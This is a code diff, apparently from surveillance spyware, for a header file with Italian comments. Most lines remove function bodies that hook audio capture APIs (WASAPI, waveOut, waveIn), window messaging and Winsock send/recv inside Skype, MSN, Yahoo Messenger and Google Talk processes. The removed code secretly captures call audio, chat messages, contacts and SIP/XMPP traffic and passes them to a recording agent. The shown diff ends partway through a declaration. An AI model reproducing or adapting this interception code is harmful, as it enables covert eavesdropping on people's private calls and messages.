-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++; 
-		if (_stricmp(proc_name, "skype.exe"))
-			return 1; // Hooka solo skype.exe
-	} else
-		return 1;
-	
-	WASAPIGetBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	WASAPIGetBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	WASAPIGetBufferData.obj_ptr = NULL;
-	WASAPIGetBufferData.audio_data = NULL;
-
-	if (GetWASAPICaptureFunction(&(WASAPIGetBufferData.bAPIAdd), WASAPI_GETBUFFER, NULL, NULL) != S_OK)
-		return 1;
-
-	WASAPIGetBufferData.dwHookLen = 350;
-	return 0;
-}
-
-DWORD PM_WASAPICaptureGetBufferMSN_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-
-	// Verifica autonomamente se si tratta del processo voip
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++; 
-		if (_stricmp(proc_name, "msnmsgr.exe") || !IsVista(NULL))
-			return 1; // Hooka solo MSN
-	} else
-		return 1;
-	
-	WASAPIGetBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	WASAPIGetBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	WASAPIGetBufferData.obj_ptr = NULL;
-	WASAPIGetBufferData.obj_ptr2 = NULL;
-	WASAPIGetBufferData.audio_data = NULL;
-	WASAPIGetBufferData.audio_data2 = NULL;
-
-	if (GetWASAPICaptureFunction(&(WASAPIGetBufferData.bAPIAdd), WASAPI_GETBUFFER, NULL, NULL) != S_OK)
-		return 1;
-
-	WASAPIGetBufferData.dwHookLen = 550;
-	return 0;
-}
-
-HRESULT __stdcall PM_WASAPICaptureReleaseBuffer(BYTE *class_ptr, 
-												DWORD NumFramesWrittem)
-{
-	BOOL *Active;
-
-	MARK_HOOK
-	INIT_WRAPPER(WASAPIReleaseBufferStruct)
-	
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (Active && (*Active)) {
-		// Solo se e' una Release sull'ultimo oggetto su cui ha fatto la GetBuffer
-		if (pData->c_data->obj_ptr==class_ptr && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
-			if (pData->sampling != 0) {
-				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_INPUT, IPC_HI_PRIORITY);
-				pData->sampling = 0;
-			}
-			LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*SKYPE_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
-			pData->c_data->obj_ptr = NULL;
-		}
-	}
-
-	CALL_ORIGINAL_API(2);
-	return ret_code;
-}
-
-HRESULT __stdcall PM_WASAPICaptureReleaseBufferMSN(BYTE *class_ptr, 
-												DWORD NumFramesWrittem)
-{
-	BOOL *Active;
-
-	MARK_HOOK
-	INIT_WRAPPER(WASAPIReleaseBufferStruct)
-	
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (Active && (*Active)) {
-		// Solo se e' una Release sull'ultimo oggetto su cui ha fatto la GetBuffer
-		if (pData->c_data->obj_ptr2==class_ptr && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
-			if (pData->sampling2 != NumFramesWrittem*100) {
-				pData->sampling2 = NumFramesWrittem*100;
-				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling2), 4, FLAGS_SAMPLING | FLAGS_OUTPUT, IPC_HI_PRIORITY);
-			}
-			LARGE_CLI_WRITE(pData->c_data->audio_data2, NumFramesWrittem*MSN_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
-		}
-
-		if (pData->c_data->obj_ptr==class_ptr && NumFramesWrittem>0 && pData->pHM_IpcCliWrite) {
-			if (pData->sampling != NumFramesWrittem*100) {
-				pData->sampling = NumFramesWrittem*100;
-				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)&(pData->sampling), 4, FLAGS_SAMPLING | FLAGS_INPUT, IPC_HI_PRIORITY);
-			}
-			LARGE_CLI_WRITE(pData->c_data->audio_data, NumFramesWrittem*MSN_WASAPI_BITS*pData->n_channels, ((pData->n_channels)<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
-		}
-	}
-
-	CALL_ORIGINAL_API(2);
-	return ret_code;
-}
-
-DWORD PM_WASAPICaptureReleaseBuffer_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-
-	// Verifica autonomamente se si tratta del processo voip
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++; 
-		if (_stricmp(proc_name, "skype.exe"))
-			return 1; // Hooka solo skype.exe
-	} else
-		return 1;
-	
-	WASAPIReleaseBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	WASAPIReleaseBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	WASAPIReleaseBufferData.c_data = (WASAPIGetBufferStruct *)pData->PARAM[0];
-	WASAPIReleaseBufferData.prog_type = VOIP_SKWSA;
-
-	if (GetWASAPICaptureFunction(&(WASAPIReleaseBufferData.bAPIAdd), WASAPI_RELEASEBUFFER, &(WASAPIReleaseBufferData.n_channels), &(WASAPIReleaseBufferData.sampling)) != S_OK)
-		return 1;
-
-	WASAPIReleaseBufferData.dwHookLen = 700;
-	return 0;
-}
-
-DWORD PM_WASAPICaptureReleaseBufferMSN_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-
-	// Verifica autonomamente se si tratta del processo voip
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++; 
-		if (_stricmp(proc_name, "msnmsgr.exe") || !IsVista(NULL))
-			return 1; // Hooka solo MSN
-	} else
-		return 1;
-	
-	WASAPIReleaseBufferData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	WASAPIReleaseBufferData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	WASAPIReleaseBufferData.c_data = (WASAPIGetBufferStruct *)pData->PARAM[0];
-	WASAPIReleaseBufferData.prog_type = VOIP_MSNWS;
-	WASAPIReleaseBufferData.sampling = NULL;
-	WASAPIReleaseBufferData.sampling2 = NULL;
-
-	if (GetWASAPICaptureFunction(&(WASAPIReleaseBufferData.bAPIAdd), WASAPI_RELEASEBUFFER, &(WASAPIReleaseBufferData.n_channels), NULL) != S_OK)
-		return 1;
-
-	WASAPIReleaseBufferData.dwHookLen = 700;
-	return 0;
-}
 
 ///////////////////////////
 //
@@ -1132,82 +254,13 @@ typedef struct {
 	waveOutGetID_t pwaveOutGetID;
 } waveOutWriteStruct;
 
-waveOutWriteStruct waveOutWriteData;
+extern waveOutWriteStruct waveOutWriteData;
 
 DWORD __stdcall PM_waveOutWrite(HWAVEOUT ARG1,
-                                WAVEHDR *WaveHdr,
-					  		    DWORD ARG3)
-{
-	UINT devID;
-	BOOL *Active;
-	DWORD channels = 1;
+	WAVEHDR* WaveHdr,
+	DWORD ARG3);
 
-	MARK_HOOK
-
-	INIT_WRAPPER(waveOutWriteStruct)
-	CALL_ORIGINAL_API(3)
-
-	// Se e' andato storto, ritorna
-	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=MMSYSERR_NOERROR)
-		return ret_code;
-
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (!Active || !(*Active))
-		return ret_code;
-
-	pData->pwaveOutGetID(ARG1, &devID);
-
-	if (pData->prog_type == VOIP_SKYPE)
-		channels = 2;
-
-	// Non registra le scritture sul wave mapper
-	if (devID!=0xFFFFFFFF) 
-		// Invia tutto al dispatcher
-		LARGE_CLI_WRITE((BYTE *)WaveHdr->lpData, WaveHdr->dwBufferLength, (channels<<30) | (pData->prog_type<<24) | FLAGS_OUTPUT, IPC_LOW_PRIORITY);
-
-	return ret_code;
-}
-
-
-DWORD PM_waveOutWrite_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-	HMODULE hMod;
-
-	// Verifica autonomamente se si tratta del processo voip
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++;
-		if (_stricmp(proc_name, "skype.exe") &&
-			_stricmp(proc_name, "yahoomessenger.exe") &&
-			_stricmp(proc_name, "googletalk.exe"))
-			return 1; // Hooka solo skype, yahoo, gtalk
-	} else
-		return 1;
-
-	if (!_stricmp(proc_name, "skype.exe"))
-		waveOutWriteData.prog_type = VOIP_SKYPE;
-	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
-		waveOutWriteData.prog_type = VOIP_YAHOO;
-	else if (!_stricmp(proc_name, "googletalk.exe"))
-		waveOutWriteData.prog_type = VOIP_GTALK;
-	else
-		waveOutWriteData.prog_type = 0;
-
-	VALIDPTR(hMod = LoadLibrary("winmm.DLL"))
-	VALIDPTR(waveOutWriteData.pwaveOutGetID = (waveOutGetID_t) HM_SafeGetProcAddress(hMod, (char*)"waveOutGetID"))
-	waveOutWriteData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	waveOutWriteData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-
-	waveOutWriteData.dwHookLen = 750;
-	return 0;
-}
-
-
+DWORD PM_waveOutWrite_setup(HMServiceStruct* pData);
 ///////////////////////////
 //
 // waveInUnprepareHeader
@@ -1219,81 +272,13 @@ typedef struct {
 	waveInGetID_t pwaveInGetID;
 } waveInUnprepareHeaderStruct;
 
-waveInUnprepareHeaderStruct waveInUnprepareHeaderData;
+extern waveInUnprepareHeaderStruct waveInUnprepareHeaderData;
 
 DWORD __stdcall PM_waveInUnprepareHeader(HWAVEOUT ARG1,
-                                         WAVEHDR *WaveHdr,
-					  		             DWORD ARG3)
-{
-	UINT devID;
-	BOOL *Active;
-	DWORD channels = 1;
+	WAVEHDR* WaveHdr,
+	DWORD ARG3);
 
-	MARK_HOOK
-
-	INIT_WRAPPER(waveInUnprepareHeaderStruct)
-	CALL_ORIGINAL_API(3)
-
-	// Se e' andato storto, ritorna
-	if(!((DWORD)pData->pHM_IpcCliWrite) || ret_code!=MMSYSERR_NOERROR)
-		return ret_code;
-
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (!Active || !(*Active))
-		return ret_code;
-
-	pData->pwaveInGetID(ARG1, &devID);
-
-	if (pData->prog_type == VOIP_SKYPE)
-		channels = 2;
-
-	// Non registra le scritture sul wave mapper
-	if (devID!=0xFFFFFFFF) 
-		// Invia tutto al dispatcher
-		LARGE_CLI_WRITE((BYTE *)WaveHdr->lpData, WaveHdr->dwBufferLength, (channels<<30) | (pData->prog_type<<24) | FLAGS_INPUT, IPC_LOW_PRIORITY);
-
-	return ret_code;
-}
-
-
-DWORD PM_waveInUnprepareHeader_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-	HMODULE hMod;
-
-	// Verifica autonomamente se si tratta del processo voip
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++;
-		if (_stricmp(proc_name, "skype.exe") &&
-			_stricmp(proc_name, "yahoomessenger.exe") &&
-			_stricmp(proc_name, "googletalk.exe"))
-			return 1; // Hooka solo skype, yahoo, gtalk
-	} else 
-		return 1;
-
-	if (!_stricmp(proc_name, "skype.exe"))
-		waveInUnprepareHeaderData.prog_type = VOIP_SKYPE;
-	else if (!_stricmp(proc_name, "yahoomessenger.exe"))
-		waveInUnprepareHeaderData.prog_type = VOIP_YAHOO;
-	else if (!_stricmp(proc_name, "googletalk.exe"))
-		waveInUnprepareHeaderData.prog_type = VOIP_GTALK;
-	else
-		waveInUnprepareHeaderData.prog_type = 0;
-
-	VALIDPTR(hMod = LoadLibrary("winmm.DLL"))
-	VALIDPTR(waveInUnprepareHeaderData.pwaveInGetID = (waveInGetID_t) HM_SafeGetProcAddress(hMod, (char *)"waveInGetID"))
-	waveInUnprepareHeaderData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	waveInUnprepareHeaderData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	
-	waveInUnprepareHeaderData.dwHookLen = 750;
-	return 0;
-}
-
+DWORD PM_waveInUnprepareHeader_setup(HMServiceStruct* pData);
 
 ///////////////////////////
 //
@@ -1319,187 +304,17 @@ typedef struct {
 	BOOL is_spm_installed;
 	UINT attach_msg;
 } SendMessageStruct;
-SendMessageStruct SendMessageData;
+extern SendMessageStruct SendMessageData;
 
-LRESULT __stdcall PM_SendMessage(  HWND hWnd,
-								   UINT Msg,
-								   WPARAM wParam,
-								   LPARAM lParam,
-								   UINT fuFlags,
-								   UINT uTimeout,
-								   PDWORD_PTR lpdwResult)
-{
-	BOOL *Active_VOIP, *Active_IM, *Active_Contacts;
-	BYTE *msg_body;
-	COPYDATASTRUCT *cdata;
+LRESULT __stdcall PM_SendMessage(HWND hWnd,
+	UINT Msg,
+	WPARAM wParam,
+	LPARAM lParam,
+	UINT fuFlags,
+	UINT uTimeout,
+	PDWORD_PTR lpdwResult);
 
-	MARK_HOOK
-	INIT_WRAPPER(SendMessageStruct)
-	CALL_ORIGINAL_API(7)
-
-	// Controlla se il monitor e' attivo
-	Active_VOIP = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	Active_IM = (BOOL *)pData->pHM_IpcCliRead(PM_IMAGENT_SKYPE);
-	Active_Contacts = (BOOL *)pData->pHM_IpcCliRead(PM_CONTACTSAGENT);
-	if (!Active_VOIP || !Active_IM || !Active_Contacts)
-		return ret_code;
-
-	// Se sono disabilitati entrambi esce
-	if (!(*Active_VOIP) && !(*Active_IM) && !(*Active_Contacts))
-		return ret_code;
-
-	if (!pData->pHM_IpcCliWrite) 
-		return ret_code;
-
-	// Skype ha dato l'ok per l'attach. Notifico i processi per poter mandare i messaggi delle api 
-	if (!pData->is_spm_installed && !pData->is_skypepm && Msg==pData->attach_msg && wParam!=NULL) {
-		if ((*Active_VOIP)) {
-			if (pData->voip_skapi_swd != hWnd  || pData->voip_skapi_wnd != (HWND)wParam) {
-				pData->voip_skapi_swd = hWnd;
-				pData->voip_skapi_wnd = (HWND)wParam;
-				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&pData->voip_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
-				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&pData->voip_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
-			}
-		}
-		if ((*Active_IM)) {
-			if (pData->im_skapi_swd != hWnd  || pData->im_skapi_wnd != (HWND)wParam) {
-				pData->im_skapi_swd = hWnd;
-				pData->im_skapi_wnd = (HWND)wParam;
-				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&pData->im_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
-				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&pData->im_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
-			}
-		}
-		if ((*Active_Contacts)) {
-			if (pData->cn_skapi_swd != hWnd  || pData->cn_skapi_wnd != (HWND)wParam) {
-				pData->cn_skapi_swd = hWnd;
-				pData->cn_skapi_wnd = (HWND)wParam;
-				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&pData->cn_skapi_wnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
-				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&pData->cn_skapi_swd), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
-			}
-		}
-	}
-	
-	if (Msg != WM_COPYDATA)
-		return ret_code;
-	cdata = (COPYDATASTRUCT *)lParam;
-	msg_body = (BYTE *)cdata->lpData;
-
-	if (pData->is_skypepm) {
-		if ((*Active_VOIP)) {
-			if (pData->voip_skapi_wnd != hWnd  || pData->voip_skapi_swd != (HWND)wParam) {
-				pData->voip_skapi_wnd = hWnd;
-				pData->voip_skapi_swd = (HWND)wParam;
-				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&hWnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
-				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&wParam), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
-			}
-		}
-		if ((*Active_IM)) {
-			if (pData->im_skapi_wnd != hWnd  || pData->im_skapi_swd != (HWND)wParam) {
-				pData->im_skapi_wnd = hWnd;
-				pData->im_skapi_swd = (HWND)wParam;
-				// Usa la dispatch del tag utilizzato per start/stop dell'agente
-				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&hWnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
-				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&wParam), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
-			}
-		}
-		if ((*Active_Contacts)) {
-			if (pData->cn_skapi_wnd != hWnd  || pData->cn_skapi_swd != (HWND)wParam) {
-				pData->cn_skapi_wnd = hWnd;
-				pData->cn_skapi_swd = (HWND)wParam;
-				// Usa la dispatch del tag utilizzato per start/stop dell'agente
-				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&hWnd), sizeof(DWORD), FLAGS_SKAPI_WND, IPC_HI_PRIORITY);
-				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)(&wParam), sizeof(DWORD), FLAGS_SKAPI_SWD, IPC_HI_PRIORITY);
-			}
-		}
-	} else { // siamo dentro Skype
-		if ((*Active_VOIP)) {
-			if (!pData->voip_is_sent) {
-				pData->voip_is_sent = TRUE;
-				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_INI, IPC_HI_PRIORITY);
-			}
-		}
-		if ((*Active_IM)) {
-			if (!pData->im_is_sent) {
-				pData->im_is_sent = TRUE;
-				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)(&ret_code), sizeof(DWORD), FLAGS_SKAPI_INI, IPC_HI_PRIORITY);
-			}
-		}
-
-		if (cdata->cbData <= 4)
-			return ret_code;
-
-		// Scremiamo i messaggi che sicuramente non ci servono
-		// CALL , #1411...  ci servono
-		if ((*Active_VOIP)) {
-			if ( (msg_body[0]=='C' && msg_body[1]=='A' && msg_body[2]=='L' && msg_body[3]=='L')  ||
-				 (msg_body[1]=='1' && msg_body[2]=='4' && msg_body[3]=='1' && msg_body[4]=='1'))
-				pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)cdata->lpData, cdata->cbData, FLAGS_SKAPI_MSG, IPC_HI_PRIORITY);
-		}
-
-		if ((*Active_IM)) {
-			if ( (msg_body[0]=='C' && msg_body[1]=='H' && msg_body[2]=='A' && msg_body[3]=='T')  ||
-				 (msg_body[0]=='M' && msg_body[1]=='E' && msg_body[2]=='S' && msg_body[3]=='S')  ||
-				 (msg_body[1]=='I' && msg_body[2]=='M' && msg_body[3]=='A' && msg_body[4]=='G'))
-				pData->pHM_IpcCliWrite(PM_IMAGENT, (BYTE *)cdata->lpData, cdata->cbData, FLAGS_SKAPI_MSG, IPC_HI_PRIORITY);
-		}
-
-		if ((*Active_Contacts)) {
-			DWORD data_len;
-			data_len = cdata->cbData;
-			// Se eccedesse, il messaggio non verrebbe mandato proprio
-			if (data_len > MAX_MSG_LEN)
-				data_len = MAX_MSG_LEN;
-			if ( (msg_body[0]=='A' && msg_body[1]=='U' && msg_body[4]=='_' && msg_body[5]=='C') ||
-				 (msg_body[0]=='C' && msg_body[1]=='U' && msg_body[2]=='R' && msg_body[3]=='R'))
-				pData->pHM_IpcCliWrite(PM_CONTACTSAGENT, (BYTE *)cdata->lpData, data_len, FLAGS_SKAPI_MSG, IPC_HI_PRIORITY);
-		}
-
-	}
-	return ret_code;
-}
-
-
-DWORD PM_SendMessage_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-
-	// Verifica autonomamente se si tratta del processo skype
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++;
-		SendMessageData.is_skypepm = FALSE;
-		if (!_stricmp(proc_name, "skypepm.exe")) {
-			SendMessageData.is_skypepm = TRUE; // siamo in skypepm
-		} else if (_stricmp(proc_name, "skype.exe"))
-			return 1; // Se non siamo in skype  non mette l'hook sulla sendmessage
-	} else
-		return 1;
-
-	if (IsSkypePMInstalled())
-		SendMessageData.is_spm_installed = TRUE;
-	else
-		SendMessageData.is_spm_installed = FALSE;
-
-	SendMessageData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	SendMessageData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	SendMessageData.voip_is_sent = FALSE;
-	SendMessageData.voip_skapi_wnd = 0;
-	SendMessageData.voip_skapi_swd = 0;
-	SendMessageData.im_is_sent = FALSE;
-	SendMessageData.im_skapi_wnd = 0;
-	SendMessageData.im_skapi_swd = 0;
-	SendMessageData.cn_is_sent = FALSE;
-	SendMessageData.cn_skapi_wnd = 0;
-	SendMessageData.cn_skapi_swd = 0;
-	SendMessageData.attach_msg = RegisterWindowMessage("SkypeControlAPIAttach");
-
-	SendMessageData.dwHookLen = 2650;
-	return 0;
-}
-
+DWORD PM_SendMessage_setup(HMServiceStruct* pData);
 
 ///////////////////////////
 //
@@ -1510,98 +325,18 @@ DWORD PM_SendMessage_setup(HMServiceStruct *pData)
 typedef struct {
 	COMMONDATA;
 } RecvStruct;
-RecvStruct RecvData;
+extern RecvStruct RecvData;
 
 int __stdcall PM_Recv(SOCKET s,
-					  char *buf,
-					  int len,
-					  int flags)
-{
-	BOOL *Active;
-	DWORD msg_len;
-
-	MARK_HOOK
-	INIT_WRAPPER(RecvStruct)
-	CALL_ORIGINAL_API(4)
-
-	// Controlla il valore di ritorno
-	if (!ret_code || ret_code==SOCKET_ERROR || buf==NULL)
-		return ret_code;
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (!Active || !(*Active))
-		return ret_code;
-
-	msg_len = ret_code;
-	if (msg_len>15 && buf[0]=='S' && buf[1]=='I' && buf[2]=='P' && buf[3]=='/')
-		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
-		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_YMSG_IN, IPC_HI_PRIORITY);
-	else if (msg_len>15 && buf[0]=='<' && buf[1]=='i' && buf[2]=='q' && buf[3]==' ')
-		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
-		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_GTALK_IN, IPC_HI_PRIORITY);
-	
-	return ret_code;
-}
+	char* buf,
+	int len,
+	int flags);
 
 int __stdcall PM_Send(SOCKET s,
-					  char *buf,
-					  int len,
-					  int flags)
-{
-	BOOL *Active;
-	DWORD msg_len;
-
-	MARK_HOOK
-	INIT_WRAPPER(RecvStruct)
-	CALL_ORIGINAL_API(4)
-
-	// Controlla il valore di ritorno
-	if (!ret_code || ret_code==SOCKET_ERROR || buf==NULL)
-		return ret_code;
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (!Active || !(*Active))
-		return ret_code;
-
-	msg_len = ret_code;
-	if (msg_len>15 && buf[0]=='S' && buf[1]=='I' && buf[2]=='P' && buf[3]=='/')
-		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
-		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_YMSG_OUT, IPC_HI_PRIORITY);
-	else if (msg_len>15 && buf[0]=='<' && buf[1]=='i' && buf[2]=='q' && buf[3]==' ')
-		// Il messaggio ricevuto sulla socket potrebbe essere piu' lungo di 1KB
-		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_GTALK_OUT, IPC_HI_PRIORITY);
-	else if(msg_len > 7 && buf[0]=='U' && buf[1]=='U' && buf[2]=='N' && buf[3]==' ')
-		pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_MSN_OUT, IPC_HI_PRIORITY);
-
-	return ret_code;
-}
-
-DWORD PM_Recv_setup(HMServiceStruct *pData)
-{
-	char proc_path[DLLNAMELEN];
-	char *proc_name;
-	HMODULE hMod;
-
-	// Verifica autonomamente se si tratta di un programma da hookare
-	ZeroMemory(proc_path, sizeof(proc_path));
-	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
-	proc_name = strrchr(proc_path, '\\');
-	if (proc_name) {
-		proc_name++;
-		if (_stricmp(proc_name, "YahooMessenger.exe") &&
-			_stricmp(proc_name, "Googletalk.exe") &&
-			_stricmp(proc_name, "msnmsgr.exe"))
-			return 1; // Hooka solo YahooMessenger, GTalk e MSN
-	} else{
-		return 1;
-	}
-
-	RecvData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
-	RecvData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
-	RecvData.dwHookLen = 850;
-	return 0;
-}
-
+	char* buf,
+	int len,
+	int flags);
+DWORD PM_Recv_setup(HMServiceStruct* pData);
 
 ///////////////////////////
 //
@@ -1618,42 +353,15 @@ typedef void (WINAPI *LPWSAOVERLAPPED_COMPLETION_ROUTINE)(DWORD, DWORD, LPWSAOVE
 typedef struct {
 	COMMONDATA;
 } WSARecvStruct;
-WSARecvStruct WSARecvData;
+extern WSARecvStruct WSARecvData;
 
 int FAR PASCAL PM_WSARecv(SOCKET s,
-						LPWSABUF lpBuffers,
-						DWORD dwBufferCount,
-						LPDWORD lpNumberOfBytesRecvd,
-						LPDWORD lpFlags,
-						LPWSAOVERLAPPED lpOverlapped,
-						LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine)
-{
-	BOOL *Active;
-	char *buf;
-	DWORD msg_len;
-
-	MARK_HOOK
-	INIT_WRAPPER(WSARecvStruct)
-	CALL_ORIGINAL_API(7)
-
-	// Controlla il valore di ritorno
-	if (ret_code!=0)
-		return ret_code;
-
-	// Controlla se il monitor e' attivo
-	Active = (BOOL *)pData->pHM_IpcCliRead(PM_VOIPRECORDAGENT);
-	if (!Active || !(*Active))
-		return ret_code;
-
-	if(lpNumberOfBytesRecvd) {
-		msg_len = *lpNumberOfBytesRecvd;
-		buf = lpBuffers[0].buf;
-		if (msg_len>15 && buf[0]=='S' && buf[1]=='I' && buf[2]=='P' && buf[3]=='/')
-			pData->pHM_IpcCliWrite(PM_VOIPRECORDAGENT, (BYTE *)(buf), (msg_len>MAX_MSG_LEN)?MAX_MSG_LEN:msg_len, FLAGS_YMSG_IN, IPC_HI_PRIORITY);
-	}
-
-	return ret_code;
-}
+	LPWSABUF lpBuffers,
+	DWORD dwBufferCount,
+	LPDWORD lpNumberOfBytesRecvd,
+	LPDWORD lpFlags,
+	LPWSAOVERLAPPED lpOverlapped,
+	LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine);
 
 DWORD PM_WSARecv_setup(HMServiceStruct *pData);
 
@@ -1733,3 +441,29 @@ DWORD __stdcall PM_VoipRecordStartStop(BOOL bStartFlag, BOOL bReset);
 DWORD __stdcall PM_VoipRecordInit(JSONObject elem);
 DWORD __stdcall PM_VoipRecordUnregister();
 void PM_VoipRecordRegister();
+
+HRESULT __stdcall PM_WASAPICaptureGetBuffer(BYTE* class_ptr,
+	BYTE** ppData,
